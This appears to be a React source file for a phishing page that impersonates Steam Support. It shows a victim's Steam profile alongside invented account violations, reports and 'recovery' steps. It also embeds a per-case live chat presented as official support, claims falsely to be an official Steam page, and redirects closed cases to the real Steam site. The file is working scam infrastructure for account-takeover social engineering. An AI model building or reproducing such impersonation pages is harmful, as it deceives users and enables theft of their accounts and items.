import { useEffect } from "react";
import { useParams } from "wouter";
import { useQuery } from "@tanstack/react-query";
import { api } from "../lib/api";
import { Shield, AlertTriangle, FileText, CheckCircle, Clock, Gamepad2 } from "lucide-react";

declare global {
  interface Window {
    tidioChatApi?: any;
    tidioIdentifyScript?: boolean;
  }
}

function injectTidio(tidioKey: string, caseId: string, steamName: string, steamId: string, avatar: string) {
  // Remove any existing Tidio scripts
  const existing = document.getElementById("tidio-script");
  if (existing) existing.remove();

  // Set visitor identity BEFORE loading widget
  (window as any).tidioChatApi = (window as any).tidioChatApi || {};

  const script = document.createElement("script");
  script.id = "tidio-script";
  script.src = `//code.tidio.co/${tidioKey}.js`;
  script.async = true;

  script.onload = () => {
    // Identify the visitor with Steam user info so each case chat is isolated
    if (window.tidioChatApi) {
      window.tidioChatApi.on("ready", () => {
        window.tidioChatApi.setVisitorData({
          distinct_id: caseId, // unique per case → isolated chat session
          email: `${steamId}@steam.case`,
          name: steamName,
          avatar: avatar,
          tags: [`case:${caseId}`, `steamid:${steamId}`],
        });
      });
    }
  };

  document.body.appendChild(script);
}

function formatDate(unix: number): string {
  if (!unix) return "Unknown";
  return new Date(unix * 1000).toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" });
}

function SteamHeader() {
  return (
    <div style={{ background: "#171a21", borderBottom: "1px solid #3d5a73", padding: "0 24px", height: 52, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
      <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
        <Shield size={18} color="#66c0f4" />
        <span style={{ color: "#c6d4df", fontSize: 14, fontWeight: "bold", letterSpacing: "0.05em" }}>STEAM</span>
        <span style={{ color: "#8f98a0", fontSize: 13 }}>Support</span>
      </div>
      <nav style={{ display: "flex", gap: 24 }}>
        {["Store", "Community", "About", "Support"].map(item => (
          <span key={item} style={{ color: item === "Support" ? "#66c0f4" : "#8f98a0", fontSize: 13, cursor: "pointer" }}>{item}</span>
        ))}
      </nav>
    </div>
  );
}

export default function CasePage() {
  const { id } = useParams<{ id: string }>();

  const { data, isLoading, isError } = useQuery({
    queryKey: ["case-public", id],
    queryFn: async () => {
      const res = await api.cases[":id"].$get({ param: { id } });
      if (!res.ok) throw new Error("Not found");
      return (await res.json()) as { case: any };
    },
    retry: false,
  });

  const c = data?.case;

  // Redirect if closed
  useEffect(() => {
    if (c && c.status === "closed") {
      window.location.href = "https://steamcommunity.com";
    }
  }, [c]);

  // Inject Tidio with visitor identity
  useEffect(() => {
    if (c && c.status === "open" && c.tidioKey) {
      injectTidio(c.tidioKey, c.id, c.displayName, c.steamId, c.avatar);
    }
    return () => {
      // Cleanup on unmount
      const s = document.getElementById("tidio-script");
      if (s) s.remove();
      const chatContainer = document.getElementById("tidio-chat");
      if (chatContainer) chatContainer.remove();
    };
  }, [c?.id, c?.tidioKey, c?.status]);

  if (isLoading) {
    return (
      <div style={{ minHeight: "100vh", background: "#1b2838", display: "flex", alignItems: "center", justifyContent: "center" }}>
        <SteamHeader />
        <div style={{ textAlign: "center" }}>
          <div style={{ width: 40, height: 40, border: "3px solid #3d5a73", borderTopColor: "#66c0f4", borderRadius: "50%", animation: "spin 1s linear infinite", margin: "0 auto 16px" }} />
          <p style={{ color: "#8f98a0" }}>Loading support case...</p>
        </div>
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    );
  }

  if (isError || !c) {
    return (
      <div style={{ minHeight: "100vh", background: "#1b2838" }}>
        <SteamHeader />
        <div style={{ maxWidth: 600, margin: "80px auto", textAlign: "center", padding: "0 24px" }}>
          <AlertTriangle size={48} color="#c94040" style={{ margin: "0 auto 16px" }} />
          <h1 style={{ color: "#c6d4df", fontSize: 22 }}>Case Not Found</h1>
          <p style={{ color: "#8f98a0" }}>This support case doesn't exist or has been removed.</p>
        </div>
      </div>
    );
  }

  // If closed, show redirect message briefly
  if (c.status === "closed") {
    return (
      <div style={{ minHeight: "100vh", background: "#1b2838", display: "flex", alignItems: "center", justifyContent: "center" }}>
        <SteamHeader />
        <p style={{ color: "#8f98a0" }}>Redirecting to Steam...</p>
      </div>
    );
  }

  const accountAge = c.accountCreated
    ? Math.floor((Date.now() / 1000 - c.accountCreated) / (365.25 * 24 * 3600))
    : null;

  return (
    <div style={{ minHeight: "100vh", background: "#1b2838" }}>
      <SteamHeader />

      {/* Page title bar */}
      <div style={{ background: "linear-gradient(to right, #16202d, #1b2838)", borderBottom: "1px solid #3d5a73", padding: "14px 24px" }}>
        <div style={{ maxWidth: 960, margin: "0 auto" }}>
          <div style={{ color: "#8f98a0", fontSize: 12 }}>
            <span style={{ color: "#66c0f4", cursor: "pointer" }}>Steam Support</span>
            {" › "}
            <span>Account Recovery</span>
            {" › "}
            <span style={{ color: "#c6d4df" }}>Case #{id}</span>
          </div>
        </div>
      </div>

      <div style={{ maxWidth: 960, margin: "0 auto", padding: "28px 24px", display: "grid", gridTemplateColumns: "280px 1fr", gap: 20 }}>
        {/* LEFT: Profile sidebar */}
        <div>
          {/* Profile card */}
          <div className="steam-card" style={{ overflow: "hidden" }}>
            {/* Banner */}
            <div style={{ height: 64, background: "linear-gradient(135deg, #1e3a5a, #2a475e)" }} />
            <div style={{ padding: "0 16px 16px" }}>
              <img
                src={c.avatar}
                alt=""
                style={{ width: 72, height: 72, borderRadius: 3, border: "3px solid #1b2838", marginTop: -36, display: "block" }}
              />
              <div style={{ marginTop: 10 }}>
                <div style={{ color: "#c6d4df", fontWeight: "bold", fontSize: 16 }}>{c.displayName}</div>
                <div style={{ color: "#8f98a0", fontSize: 12, marginTop: 2 }}>Steam ID: {c.steamId}</div>
              </div>

              <hr className="section-divider" />

              <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <span style={{ color: "#8f98a0", fontSize: 12 }}>Level</span>
                  <span style={{ color: "#c6d4df", fontSize: 13, fontWeight: "bold" }}>{c.level}</span>
                </div>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <span style={{ color: "#8f98a0", fontSize: 12, display: "flex", alignItems: "center", gap: 4 }}>
                    <Gamepad2 size={12} /> Games
                  </span>
                  <span style={{ color: "#c6d4df", fontSize: 13, fontWeight: "bold" }}>{c.gamesCount}</span>
                </div>
                {accountAge !== null && (
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                    <span style={{ color: "#8f98a0", fontSize: 12, display: "flex", alignItems: "center", gap: 4 }}>
                      <Clock size={12} /> Member for
                    </span>
                    <span style={{ color: "#c6d4df", fontSize: 13, fontWeight: "bold" }}>{accountAge}y</span>
                  </div>
                )}
                {c.accountCreated > 0 && (
                  <div style={{ marginTop: 4 }}>
                    <span style={{ color: "#8f98a0", fontSize: 11 }}>Account created {formatDate(c.accountCreated)}</span>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Case status */}
          <div className="steam-card" style={{ padding: 14, marginTop: 12 }}>
            <div style={{ color: "#8f98a0", fontSize: 11, textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: 8 }}>Case Status</div>
            <span className="badge-open">Active — Under Review</span>
            <div style={{ color: "#8f98a0", fontSize: 11, marginTop: 8 }}>
              Case opened: {new Date(c.createdAt).toLocaleDateString()}
            </div>
          </div>
        </div>

        {/* RIGHT: Main content */}
        <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
          {/* Violations */}
          {c.violations?.filter((v: string) => v.trim()).length > 0 && (
            <div className="steam-card" style={{ padding: 20 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 14 }}>
                <AlertTriangle size={16} color="#c94040" />
                <h2 style={{ color: "#c94040", fontSize: 14, fontWeight: "bold", textTransform: "uppercase", letterSpacing: "0.08em", margin: 0 }}>
                  Account Violations
                </h2>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                {c.violations.filter((v: string) => v.trim()).map((violation: string, i: number) => (
                  <div key={i} style={{ background: "#1a0a0a", border: "1px solid #6b2222", borderRadius: 3, padding: "10px 14px", display: "flex", gap: 10, alignItems: "flex-start" }}>
                    <div style={{ width: 6, height: 6, borderRadius: "50%", background: "#c94040", flexShrink: 0, marginTop: 5 }} />
                    <span style={{ color: "#c6d4df", fontSize: 13 }}>{violation}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Reports */}
          {c.reports?.filter((r: string) => r.trim()).length > 0 && (
            <div className="steam-card" style={{ padding: 20 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 14 }}>
                <FileText size={16} color="#66c0f4" />
                <h2 style={{ color: "#66c0f4", fontSize: 14, fontWeight: "bold", textTransform: "uppercase", letterSpacing: "0.08em", margin: 0 }}>
                  Reports Filed
                </h2>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                {c.reports.filter((r: string) => r.trim()).map((report: string, i: number) => (
                  <div key={i} style={{ background: "#0e1924", border: "1px solid #3d5a73", borderRadius: 3, padding: "10px 14px", display: "flex", gap: 10, alignItems: "flex-start" }}>
                    <span style={{ color: "#8f98a0", fontSize: 12, fontWeight: "bold", flexShrink: 0 }}>#{i + 1}</span>
                    <span style={{ color: "#c6d4df", fontSize: 13 }}>{report}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Appeal Steps */}
          {c.appealSteps?.filter((s: string) => s.trim()).length > 0 && (
            <div className="steam-card" style={{ padding: 20 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 16 }}>
                <CheckCircle size={16} color="#a4d007" />
                <h2 style={{ color: "#a4d007", fontSize: 14, fontWeight: "bold", textTransform: "uppercase", letterSpacing: "0.08em", margin: 0 }}>
                  Appeal / Recovery Process
                </h2>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
                {c.appealSteps.filter((s: string) => s.trim()).map((step: string, i: number) => (
                  <div key={i} style={{ display: "flex", gap: 14, alignItems: "flex-start" }}>
                    <div style={{ width: 28, height: 28, borderRadius: "50%", background: "linear-gradient(135deg, #4779a4, #3a5f85)", border: "2px solid #3d5a73", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, color: "#c6d4df", fontSize: 12, fontWeight: "bold" }}>
                      {i + 1}
                    </div>
                    <div style={{ paddingTop: 4 }}>
                      <span style={{ color: "#c6d4df", fontSize: 13, lineHeight: "1.5" }}>{step}</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Chat CTA */}
          <div className="steam-card" style={{ padding: 20, background: "linear-gradient(135deg, #1e3a5a, #16202d)", border: "1px solid #3d5a73" }}>
            <h2 style={{ color: "#c6d4df", fontSize: 15, fontWeight: "bold", margin: "0 0 8px" }}>Need further assistance?</h2>
            <p style={{ color: "#8f98a0", fontSize: 13, margin: "0 0 14px", lineHeight: 1.5 }}>
              Use the live chat widget in the bottom right corner to speak directly with a Steam Support representative. Have your Steam ID and case number ready.
            </p>
            <div style={{ background: "#0e1924", border: "1px solid #3d5a73", borderRadius: 3, padding: "8px 12px", display: "inline-flex", alignItems: "center", gap: 6 }}>
              <div style={{ width: 8, height: 8, borderRadius: "50%", background: "#a4d007" }} />
              <span style={{ color: "#a4d007", fontSize: 12 }}>Support agents are online</span>
            </div>
          </div>

          {/* Disclaimer */}
          <div style={{ padding: "12px 16px", background: "#0e1924", border: "1px solid #253444", borderRadius: 3 }}>
            <p style={{ color: "#556672", fontSize: 11, margin: 0, lineHeight: 1.6 }}>
              This is an official Steam Support case page. Your case ID is <strong style={{ color: "#8f98a0" }}>{id}</strong>. 
              Please do not share this link with others. All communications are logged and reviewed by the Steam Support team.
              Case reference: SP-{id?.toUpperCase()}
            </p>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
}
